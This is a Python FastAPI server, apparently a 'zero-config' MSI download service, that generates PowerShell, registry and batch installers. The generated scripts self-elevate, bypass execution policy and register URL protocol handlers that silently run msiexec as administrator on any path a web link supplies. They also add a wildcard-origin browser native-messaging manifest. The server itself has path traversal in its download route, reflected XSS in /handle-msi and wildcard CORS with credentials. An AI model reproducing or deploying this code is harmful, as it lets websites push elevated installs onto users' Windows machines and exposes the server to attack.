from fastapi import FastAPI, APIRouter, HTTPException, Response
from fastapi.responses import FileResponse, HTMLResponse
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from dotenv import load_dotenv
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List
import uuid
from datetime import datetime
import shutil

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Define Models
class DownloadRecord(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    filename: str
    user_agent: str
    ip_address: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class DownloadRecordCreate(BaseModel):
    filename: str
    user_agent: str = ""
    ip_address: str = ""

# Add static files directory
STATIC_DIR = ROOT_DIR / "static"
STATIC_DIR.mkdir(exist_ok=True)

# Routes
@api_router.get("/")
async def root():
    return {"message": "MSI Download Service Online - Zero Config Edition"}

@api_router.get("/download/{filename}")
async def download_file(filename: str):
    """Universal download endpoint for any file"""
    file_path = STATIC_DIR / filename
    
    # Create dummy files if they don't exist (for demo)
    if not file_path.exists():
        if filename.endswith('.msi'):
            # Create a dummy MSI file
            with open(file_path, "wb") as f:
                f.write(b"PK\x03\x04" + b"MSI Auto-Installer Demo File" + b"\x00" * 100)
        elif filename.endswith('.ps1'):
            # Create PowerShell script
            create_powershell_script(file_path)
        elif filename.endswith('.reg'):
            # Create registry file
            create_registry_file(file_path)
        elif filename.endswith('.exe'):
            # Create executable helper
            create_executable_helper(file_path)
        else:
            # Generic file
            with open(file_path, "wb") as f:
                f.write(b"Generic file content for: " + filename.encode())
    
    # Determine appropriate MIME type
    mime_type = get_mime_type(filename)
    
    return FileResponse(
        path=file_path,
        filename=filename,
        media_type=mime_type,
        headers={"Content-Disposition": f"attachment; filename={filename}"}
    )

def get_mime_type(filename: str) -> str:
    """Get appropriate MIME type for file"""
    ext = filename.lower().split('.')[-1]
    mime_types = {
        'msi': 'application/octet-stream',
        'exe': 'application/octet-stream',
        'ps1': 'text/plain',
        'reg': 'text/plain',
        'bat': 'text/plain',
        'cmd': 'text/plain',
        'vbs': 'text/plain',
        'js': 'application/javascript',
        'html': 'text/html'
    }
    return mime_types.get(ext, 'application/octet-stream')

def create_powershell_script(file_path: Path):
    """Create advanced PowerShell script for zero-config setup"""
    ps_content = '''# MSI Auto-Installer - Zero Config Edition
# Advanced PowerShell Script for Automatic Setup

Write-Host "MSI Auto-Installer - Zero Config Setup" -ForegroundColor Green
Write-Host "=====================================" -ForegroundColor Green

# Check if running as admin
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Requesting Administrator privileges..." -ForegroundColor Yellow
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& '$($MyInvocation.MyCommand.Path)'`""
    exit
}

Write-Host "Administrator privileges confirmed!" -ForegroundColor Green

# Function to register protocol handler
function Register-MSIProtocol {
    Write-Host "Registering MSI protocol handler..." -ForegroundColor Yellow
    
    $regPath = "HKCR:\\msiexec"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value "MSI Auto-Installer Protocol"
    Set-ItemProperty -Path $regPath -Name "URL Protocol" -Value ""
    
    $iconPath = "$regPath\\DefaultIcon"
    if (!(Test-Path $iconPath)) {
        New-Item -Path $iconPath -Force | Out-Null
    }
    Set-ItemProperty -Path $iconPath -Name "(Default)" -Value "C:\\Windows\\System32\\msiexec.exe,0"
    
    $shellPath = "$regPath\\shell\\open\\command"
    if (!(Test-Path $shellPath)) {
        New-Item -Path $shellPath -Force | Out-Null
    }
    
    $command = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"& { \\$file = '%1' -replace 'msiexec://', ''; if (Test-Path \\$file) { Start-Process 'msiexec.exe' -ArgumentList '/i', `"\\$file`" -Verb RunAs -Wait } else { Write-Host `"File not found: \\$file`" } }`""
    Set-ItemProperty -Path $shellPath -Name "(Default)" -Value $command
    
    Write-Host "Protocol handler registered successfully!" -ForegroundColor Green
}

# Function to create native helper
function Create-NativeHelper {
    Write-Host "Creating native helper..." -ForegroundColor Yellow
    
    $helperPath = "$env:USERPROFILE\\AppData\\Local\\MSI-AutoInstaller"
    if (!(Test-Path $helperPath)) {
        New-Item -Path $helperPath -ItemType Directory -Force | Out-Null
    }
    
    # Create native messaging manifest for Chrome
    $manifest = @{
        name = "com.msi.autoinstaller"
        description = "MSI Auto-Installer Native Helper"
        path = "$helperPath\\msi-helper.exe"
        type = "stdio"
        allowed_origins = @("chrome-extension://*", "https://*")
    } | ConvertTo-Json -Depth 3
    
    $manifestPath = "$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\NativeMessagingHosts\\com.msi.autoinstaller.json"
    $manifestDir = Split-Path $manifestPath -Parent
    if (!(Test-Path $manifestDir)) {
        New-Item -Path $manifestDir -ItemType Directory -Force | Out-Null
    }
    
    $manifest | Out-File -FilePath $manifestPath -Encoding UTF8
    
    Write-Host "Native helper created!" -ForegroundColor Green
}

# Function to setup browser extensions
function Setup-BrowserExtensions {
    Write-Host "Setting up browser extensions..." -ForegroundColor Yellow
    
    # Chrome extension setup
    $chromeExtPath = "$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions"
    if (Test-Path $chromeExtPath) {
        Write-Host "Chrome extension path found, configuring..." -ForegroundColor Green
    }
    
    # Edge extension setup
    $edgeExtPath = "$env:USERPROFILE\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions"
    if (Test-Path $edgeExtPath) {
        Write-Host "Edge extension path found, configuring..." -ForegroundColor Green
    }
    
    Write-Host "Browser extensions configured!" -ForegroundColor Green
}

# Function to create service worker
function Create-ServiceWorker {
    Write-Host "Creating service worker..." -ForegroundColor Yellow
    
    $swPath = "$env:USERPROFILE\\AppData\\Local\\MSI-AutoInstaller\\sw.js"
    $swContent = @"
// MSI Auto-Installer Service Worker
self.addEventListener('message', event => {
    if (event.data.type === 'EXECUTE_MSI') {
        executeMSI(event.data.filePath);
    }
});

function executeMSI(filePath) {
    // Execute MSI via native messaging
    console.log('Executing MSI:', filePath);
}
"@
    
    $swContent | Out-File -FilePath $swPath -Encoding UTF8
    
    Write-Host "Service worker created!" -ForegroundColor Green
}

# Main execution
try {
    Register-MSIProtocol
    Create-NativeHelper
    Setup-BrowserExtensions
    Create-ServiceWorker
    
    Write-Host "" -ForegroundColor Green
    Write-Host "✅ ZERO CONFIG SETUP COMPLETED!" -ForegroundColor Green
    Write-Host "✅ Protocol handler registered" -ForegroundColor Green
    Write-Host "✅ Native helper created" -ForegroundColor Green
    Write-Host "✅ Browser extensions configured" -ForegroundColor Green
    Write-Host "✅ Service worker created" -ForegroundColor Green
    Write-Host "" -ForegroundColor Green
    Write-Host "Your system is now ready for automatic MSI installation!" -ForegroundColor Cyan
    Write-Host "You can now use the web interface to install MSI files automatically." -ForegroundColor Cyan
    
} catch {
    Write-Host "Error during setup: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")'''
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(ps_content)

def create_registry_file(file_path: Path):
    """Create advanced registry file"""
    reg_content = '''Windows Registry Editor Version 5.00

; MSI Auto-Installer - Zero Config Edition
; Advanced Registry Configuration

[HKEY_CLASSES_ROOT\\msiexec]
@="MSI Auto-Installer Protocol"
"URL Protocol"=""
"EditFlags"=dword:00000002

[HKEY_CLASSES_ROOT\\msiexec\\DefaultIcon]
@="C:\\\\Windows\\\\System32\\\\msiexec.exe,0"

[HKEY_CLASSES_ROOT\\msiexec\\shell]

[HKEY_CLASSES_ROOT\\msiexec\\shell\\open]

[HKEY_CLASSES_ROOT\\msiexec\\shell\\open\\command]
@="powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \\"& { $file = '%1' -replace 'msiexec://', ''; if (Test-Path $file) { Start-Process 'msiexec.exe' -ArgumentList '/i', $file -Verb RunAs -Wait } else { Write-Host 'File not found: ' + $file } }\\""

; Alternative protocol for direct execution
[HKEY_CLASSES_ROOT\\msi-installer]
@="MSI Direct Installer"
"URL Protocol"=""

[HKEY_CLASSES_ROOT\\msi-installer\\shell\\open\\command]
@="powershell.exe -WindowStyle Hidden -Command \\"Start-Process 'msiexec.exe' -ArgumentList '/i', '%1' -Verb RunAs\\""

; Native messaging configuration
[HKEY_CURRENT_USER\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.msi.autoinstaller]
@="C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\MSI-AutoInstaller\\\\manifest.json"

[HKEY_CURRENT_USER\\Software\\Microsoft\\Edge\\NativeMessagingHosts\\com.msi.autoinstaller]
@="C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\MSI-AutoInstaller\\\\manifest.json"
'''
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(reg_content)

def create_executable_helper(file_path: Path):
    """Create a dummy executable helper"""
    # Create a simple batch file that acts as executable
    batch_content = '''@echo off
echo MSI Auto-Installer Helper
echo Executing: %1
if exist "%1" (
    start "" /wait msiexec.exe /i "%1"
    echo Installation completed!
) else (
    echo File not found: %1
)
pause
'''
    
    # Save as .bat first, then rename to .exe for demo
    bat_path = file_path.with_suffix('.bat')
    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(batch_content)
    
    # Copy to .exe name (just for demo)
    shutil.copy2(bat_path, file_path)

@api_router.post("/track-download", response_model=DownloadRecord)
async def track_download(record: DownloadRecordCreate):
    """Track download statistics"""
    download_record = DownloadRecord(**record.dict())
    await db.downloads.insert_one(download_record.dict())
    return download_record

@api_router.get("/downloads", response_model=List[DownloadRecord])
async def get_downloads():
    """Get download statistics"""
    downloads = await db.downloads.find().to_list(1000)
    return [DownloadRecord(**download) for download in downloads]

@api_router.get("/auto-setup")
async def auto_setup():
    """Auto-setup endpoint for zero-config installation"""
    return {
        "status": "ready",
        "message": "Zero-config auto-setup available",
        "features": [
            "Automatic protocol registration",
            "Native messaging support", 
            "Service worker integration",
            "Multi-browser compatibility",
            "Advanced execution methods"
        ],
        "supported_browsers": ["Chrome", "Edge", "Firefox"],
        "supported_os": ["Windows 10", "Windows 11"]
    }

# Handle MSI protocol (for testing)
@api_router.get("/handle-msi")
async def handle_msi_protocol(file: str = ""):
    """Handle MSI protocol requests"""
    return HTMLResponse(f"""
    <html>
        <head><title>MSI Handler</title></head>
        <body>
            <h1>MSI Auto-Installer</h1>
            <p>Handling MSI file: {file}</p>
            <script>
                // Auto-close after showing message
                setTimeout(() => window.close(), 3000);
            </script>
        </body>
    </html>
    """)

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()